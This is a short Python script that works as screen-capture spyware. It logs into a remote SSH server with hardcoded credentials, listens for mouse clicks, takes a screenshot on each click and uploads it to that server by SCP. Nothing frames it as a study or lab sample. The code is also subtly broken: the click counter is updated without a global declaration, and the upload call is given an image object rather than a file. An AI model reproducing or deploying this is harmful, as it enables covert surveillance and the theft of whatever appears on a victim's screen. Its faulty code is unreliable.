from pynput.mouse import Listener
from scp import SCPClient
from paramiko import SSHClient
import logging
import pyautogui

ssh=SSHClient()
ssh.load_system_host_keys()
ssh.connect('pl-ssh.sshmax.xyz',22,"sshmax-tennet","tennet111")
scpCl = SCPClient(ssh.get_transport())

count=0
def on_click(x, y, button, pressed):
    if pressed:
        screensht=pyautogui.screenshot()
        scpCl.put(screensht,"test"+str(count)+".png")
        screensht.save("test"+str(count)+".png")
        #global count
        count += 1

with Listener(on_click=on_click) as listener:
    listener.join()
    scpCl.close()
